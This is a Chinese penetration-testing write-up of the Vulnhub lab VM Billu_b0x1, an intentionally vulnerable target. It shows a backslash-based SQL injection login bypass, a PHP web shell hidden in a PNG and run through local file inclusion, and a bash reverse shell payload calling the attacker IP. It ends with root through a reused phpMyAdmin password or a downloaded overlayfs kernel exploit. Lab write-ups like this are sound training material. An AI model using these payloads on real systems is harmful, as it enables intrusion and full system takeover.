+++
date = '2026-11-06T18:46:07+08:00'
draft = false
title = '[Vulnhub靶机]Billu_b0x1渗透记录'
tags = ['渗透','Vulnhub','代码审计','SQLi','LFI','Kernel']
+++

## 信息收集

### 主机发现与端口扫描

攻击机IP: 10.10.10.3
靶机IP: 10.10.10.8

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ sudo arp-scan -l             
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.8      00:0c:29:ad:88:b0       VMware, Inc.
10.10.10.254    00:50:56:e0:f0:a6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.040 seconds (125.49 hosts/sec). 4 responded
```

探测靶机开放端口

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ sudo nmap --min-rate 10000 -p- 10.10.10.8     
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-06 18:50 +0800
Nmap scan report for 10.10.10.8
Host is up (0.000053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:AD:88:B0 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.63 seconds
```

深入扫描

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ sudo nmap -sT -sV -O 10.10.10.8
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-06 18:50 +0800
Nmap scan report for 10.10.10.8
Host is up (0.00064s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 00:0C:29:AD:88:B0 (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.991%E=4%D=11/6%OT=22%CT=1%CU=41699%PV=Y%DS=1%DC=D%G=Y%M=000C29%
OS:TM=6AEDB124%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=I%II=
OS:I%TS=8)SEQ(SP=102%GCD=2%ISR=104%TI=Z%CI=I%TS=8)SEQ(SP=105%GCD=1%ISR=107%
OS:TI=Z%CI=I%TS=8)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=I%TS=8)SEQ(SP=105%GCD=1%
OS:ISR=10F%TI=Z%CI=I%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7
OS:%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W
OS:4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(
OS:R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=B1C2A1A3%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=B1
OS:C2A1A3%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=B1C2A1A3%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=B1C2A1A3%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.33 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ sudo nmap --script=vuln -p22,80 10.10.10.8              
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-06 18:52 +0800
Nmap scan report for 10.10.10.8
Host is up (0.00039s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /test.php: Test page
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
MAC Address: 00:0C:29:AD:88:B0 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
```

注意到网站存在`test.php`文件

## Web渗透

### test.php文件读取

浏览器访问靶机80端口的Web服务, 标题直接提醒我们使用SQL注入

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Billu_b0x1/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1.avif)

使用了几个常用的注入方法没有成功, 访问test.php看看

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Billu_b0x1/%E8%AE%BF%E9%97%AEtest.php.avif)

返回提示我们提供file参数, 尝试URL传参无效, 同过POST表单传参/etc/passwd成功获得passwd内容

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ curl http://10.10.10.8/test.php -d 'file=/etc/passwd' -X POST                                         
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:106::/var/run/dbus:/bin/false
whoopsie:x:104:107::/nonexistent:/bin/false
landscape:x:105:110::/var/lib/landscape:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
```

读取shadow失败

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ curl http://10.10.10.8/test.php -d 'file=/etc/shadow' -X POST
curl: (18) end of response with 897 bytes missing
```

尝试直接读取网站源码`index.php`, 成功, 发现里面存在登录验证逻辑

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ curl http://10.10.10.8/test.php -d 'file=/var/www/index.php' -X POST
```

```php
<?php
session_start();

include('c.php');
include('head.php');
if(@$_SESSION['logged']!=true)
{
        $_SESSION['logged']='';

}

if($_SESSION['logged']==true &&  $_SESSION['admin']!='')
{

        echo "you are logged in :)";
        header('Location: panel.php', true, 302);
}
else
{
echo '<div align=center style="margin:30px 0px 0px 0px;">
<font size=8 face="comic sans ms">--==[[ billu b0x ]]==--</font>
<br><br>
Show me your SQLI skills <br>
<form method=post>
Username :- <Input type=text name=un> &nbsp Password:- <input type=password name=ps> <br><br>
<input type=submit name=login value="let\'s login">';
}
if(isset($_POST['login']))
{
        $uname=str_replace('\'','',urldecode($_POST['un']));
        $pass=str_replace('\'','',urldecode($_POST['ps']));
        $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
        $result = mysqli_query($conn, $run);
if (mysqli_num_rows($result) > 0) {

$row = mysqli_fetch_assoc($result);
           echo "You are allowed<br>";
           $_SESSION['logged']=true;
           $_SESSION['admin']=$row['username'];

         header('Location: panel.php', true, 302);

}
else
{
        echo "<script>alert('Try again');</script>";
}

}
echo "<font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\">B0X Powered By <font color=#ff9933>Pirates</font> ";

?>
```

注意到脚本开头包含了两个`c.php`和`head.php`, 读取它们  
**c.php:**

```php
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno())
  {
  echo "connection failed ->  " . mysqli_connect_error();
  }

?>
```

发现数据库用户名`billu`, 密码`b0x_billu`, 数据库`ica_lab`

head.php中是CSS, 没什么有用的信息, 内容比较长就不放了

### 代码审计

注意到我们传入的参数会先进行URL解码, 然后再将`'`替换为空字符串, 所以之前尝试都没用

```php
$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));
$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
$result = mysqli_query($conn, $run);
```

既然我们无法输入单引号, 那就利用SQL查询字符串自带的单引号, 我们可以在密码那一栏输入`\`, 这样整个语句就会变成这样:

```sql
select * from auth where pass='\' and uname='$uname'
```

由于\'在SQL中会被转义成普通单引号, 所以整个`\' and uname='`就会变成pass的值, 而后面的`$uname'`就是我们能操控的部分, 此时uname输入` or 1-- -`就能登录:

```sql
select * from auth where pass='\' and uname=' or 1-- -'
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Billu_b0x1/SQL%E6%B3%A8%E5%85%A5%E7%99%BB%E5%BD%95.avif)

### 文件上传与LFI

点击show user会列出一些用户信息

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Billu_b0x1/showuser.avif)

选择Add User, 我们可以上传文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Billu_b0x1/adduser1.avif)

直接上传一句话木马, 发现只允许我们上传图片

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ echo '<?php system($_GET["cmd"]);?>' > shell.php
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Billu_b0x1/%E5%8F%AA%E5%85%81%E8%AE%B8%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6.avif)

制作图片马, 首先准备一张正常图片

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/test/milkdragon.png)

向其追加一句话木马

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ echo '<?php system($_POST["cmd"]);?>' >> milkdragon.png
                                                                                                                                 
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ tail -n 1 milkdragon.png                                                                                                
����}��u�IEND�B`�<?php system($_POST["cmd"]);?>
```

这回上传成功了

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Billu_b0x1/%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F.avif)

show users, 发现我们新增的用户, 且图片地址为`http://10.10.10.8/uploaded_images/milkdragon.png`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Billu_b0x1/%E5%8F%91%E7%8E%B0%E6%96%B0%E5%A2%9E%E7%94%A8%E6%88%B7.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Billu_b0x1/%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80.avif)

尝试使用之前的test.php进行文件包含, 然而发现不能执行代码

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ curl 'http://10.10.10.8/test.php' -d 'file=/var/www/uploaded_images/milkdragon.png&cmd=whoami' -X POST --output - | tail -n 5 
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100  53659 100  53604 100     55 10.18M  10962                              0
(BBEPU�Ūe�ZU%aUQU���TD�Ua�S�$TH���b�R�J[&���cK��Iq�XU���Z��X��VID�eRd-�U�*�*V�I�`TPH(�PUŪ����*�%U��jU�4D�
Q�A-���U����PU�U@���Րji�2bˈVACD-�$
                                  (     E��
        U�*(`�U�Bl����PP����(*0I��T����PH��d�*���ZE�e��c��6&���Ԋ���UKl-�U��D�%�-��$�8&��(�DVI�b��U��[PUET��VI����UT-    ���bUQ,��
�PDbĆH\El�
�e�-�ZF
      �$T�_QU�
����}��u�IEND�B`�<?php system($_POST["cmd"]);?>
```

阅读test.php源码, 发现其只是用readfile读取文件并输出, 没用include, 故无法执行php代码

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ curl 'http://10.10.10.8/test.php' -d 'file=/var/www/test.php' -X POST
```

```php
<?php


function file_download($download)
{
        if(file_exists($download))
                                {
                                        header("Content-Description: File Transfer");

                                        header('Content-Transfer-Encoding: binary');
                                        header('Expires: 0');
                                        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
                                        header('Pragma: public');
                                        header('Accept-Ranges: bytes');
                                        header('Content-Disposition: attachment; filename="'.basename($download).'"');
                                        header('Content-Length: ' . filesize($download));
                                        header('Content-Type: application/octet-stream');
                                        ob_clean();
                                        flush();
                                        readfile ($download);
                                }
                                else
                                {
                                echo "file not found";
                                }

}
if(isset($_POST['file']))
{
file_download($_POST['file']);
}                                                                                                                                                                                                                
else{

echo '\'file\' parameter is empty. Please provide file path in \'file\' parameter ';
}
```

观察点击show users时, 浏览器会向panel.php提交一个表单

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Billu_b0x1/load.avif)

利用test.php查看其内容, 发现网站会包含提交的load参数, 格式为 `脚本运行目录+load值`

```php
if(isset($_POST['continue']))
{
        $dir=getcwd();
        $choice=str_replace('./','',$_POST['load']);

        if($choice==='add')
        {
                include($dir.'/'.$choice.'.php');
                        die();
        }

        if($choice==='show')
        {

                include($dir.'/'.$choice.'.php');
                die();
        }
        else
        {
                include($dir.'/'.$_POST['load']);
        }

}
```

尝试包含图片, 注意要附上Cookie

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ curl http://10.10.10.8/panel.php -d 'load=uploaded_images/milkdragon.png&continue=continue&cmd=whoami' -X POST -b 'PHPSESSID=92atfke5jk1pl3f25ikgsuebj5' -s --output - | tail -n 1
����}��u�IEND�B`�www-data
```

成功RCE! 靶机开启监听, 构造反弹shell Payload

```shell
curl http://10.10.10.8/panel.php -d 'load=uploaded_images/milkdragon.png&continue=continue&cmd=bash+-c+%22bash+-i+%3E%26%2Fdev%2Ftcp%2F10.10.10.3%2F4444+0%3E%261%22' -X POST -b 'PHPSESSID=92atfke5jk1pl3f25ikgsuebj5' -s --output - | tail -n 1
```

至此, 我们拿到了立足点

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
10.10.10.8: inverse host lookup failed: Unknown host
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.8] 52680
bash: no job control in this shell
www-data@indishell:/var/www$
```

## 权限提升

终端升级

```shell
www-data@indishell:/var/www$ python -c "import pty;pty.spawn('/bin/bash')"
```

### 方法1: phpmyadmin配置提权

查看网站目录, 发现phpmy文件夹

```shell
www-data@indishell:/var/www$ ls                                                    
ls                                                                                 
add.php  head.php   images  index.php  phpmy     test.php        
c.php    head2.php  in.php  panel.php  show.php  uploaded_images
```

列出配置文件

```shell
www-data@indishell:/var/www/phpmy$ ls -ld *config*
ls -ld *config*
-rw-rw-r-- 1 ica ica  896 Nov 21  2015 config.inc.php
-rw-rw-r-- 1 ica ica 3732 Oct 31  2011 config.sample.inc.php
-rw-rw-r-- 1 ica ica  315 Oct 31  2011 show_config_errors.php
```

读取发现一个密码`roottoor`

```php
<?php

/* Servers configuration */
$i = 0;

/* Server: localhost [1] */
$i++;
$cfg['Servers'][$i]['verbose'] = 'localhost';
$cfg['Servers'][$i]['host'] = 'localhost';
$cfg['Servers'][$i]['port'] = '';
$cfg['Servers'][$i]['socket'] = '';
$cfg['Servers'][$i]['connect_type'] = 'tcp';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['auth_type'] = 'cookie';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'roottoor';
$cfg['Servers'][$i]['AllowNoPassword'] = true;

/* End of servers configuration */

$cfg['DefaultLang'] = 'en-utf-8';
$cfg['ServerDefault'] = 1;
$cfg['UploadDir'] = '';
$cfg['SaveDir'] = '';


/* rajk - for blobstreaming */
$cfg['Servers'][$i]['bs_garbage_threshold'] = 50;
$cfg['Servers'][$i]['bs_repository_threshold'] = '32M';
$cfg['Servers'][$i]['bs_temp_blob_timeout'] = 600;
$cfg['Servers'][$i]['bs_temp_log_threshold'] = '32M';


?>
```

尝试用它登录root账户, 成功提权

```shell
www-data@indishell:/var/www/phpmy$ su root
su root
Password: roottoor

root@indishell:/var/www/phpmy# whoami
whoami
root
```

### 方法2: 内核提权

查看系统信息, 发现是Ubuntu 12.04.5 LTS, 内核版本3.13.0-32-generic

```shell
www-data@indishell:/var/www/phpmy$ uname -a
Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
www-data@indishell:/var/www/phpmy$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 12.04.5 LTS
Release:        12.04
Codename:       precise
```

搜素漏洞

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ searchsploit Linux Kernel 3.13.0 Privilege Escalation
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                            | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                                    | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                                           | linux/local/41995.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                 | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)            | linux/local/37293.txt
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation                                       | linux_x86-64/local/33516.c      
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                               | linux_x86-64/local/31347.c      
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                           | linux/local/41886.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                    | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                         | linux_x86-64/local/44302.c      
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                                                         | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                    | linux/local/45553.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                        | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                               | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                    | linux_x86-64/local/44300.c      
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)            | linux/local/47169.c
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

使用37292

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ searchsploit -m 37292
```

攻击机开启服务器

```shell
┌──(kali㉿kali)-[~/Billu_b0x1]
└─$ python3 -m http.server
```

靶机下载到/tmp目录内

```shell
www-data@indishell:/var/www/phpmy$ cd /tmp
www-data@indishell:/tmp$ wget http://10.10.10.3:8000/37292.c
www-data@indishell:/tmp$ gcc -o exp 37292.c
www-data@indishell:/tmp$ ./exp
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
whoami
root
```

本靶机无flag, 获得root权限即提权成功
